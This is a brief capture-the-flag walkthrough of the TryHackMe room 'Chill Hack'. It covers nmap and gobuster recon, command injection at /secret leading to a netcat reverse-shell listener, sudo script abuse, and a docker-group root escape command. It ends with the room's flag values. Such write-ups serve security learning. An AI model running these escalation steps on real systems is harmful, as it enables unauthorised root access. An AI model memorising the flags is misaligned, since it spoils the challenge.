# chill-hack — TryHackMe

```text
[ TARGET ] 10.65.170.96
[ ROOM   ] Chill Hack
[ GOAL   ] user.txt / root.txt
[ STATUS ] DONE
```

## 01 — Recon (nmap)

```console
$ nmap -sC -sV -Pn -T5 10.65.170.96
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5  (anon OK → note.txt)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41  (Game Info)
```

## 02 — FTP + enum web

```console
$ # note.txt
Anurodh told me that there is some filtering on strings
being put in the command -- Apaar

$ gobuster dir -u http://10.65.170.96 -w common.txt
/secret               (Status: 200)   # command page
```

→ Achado: command injection com filtro em `/secret`.

## 03 — RCE → shell

```console
$ # bypass do filtro no /secret → reverse shell (www-data)
$ # listener local (VPN)
$ nc -n -l -p 4444
```

→ Achado: shell como `www-data` / foothold.

## 04 — User flag (apaar)

```console
$ sudo -l
# (www-data) NOPASSWD: /home/apaar/.helpline.sh

$ sudo -u apaar /home/apaar/.helpline.sh
# input inseguro → shell como apaar

$ cat /home/apaar/local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

## 05 — Root (docker / anurodh)

```console
$ # caminho típico: creds/stego → user anurodh (grupo docker)
$ id
# … groups=…,docker

$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
$ cat /root/proof.txt
{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```

→ Achado: docker group ≡ root no host.

## FLAGS / RESPOSTAS

| Item | Valor |
|---|---|
| user | `{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}` (`/home/apaar/local.txt`) |
| root | `{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}` (`/root/proof.txt`) |
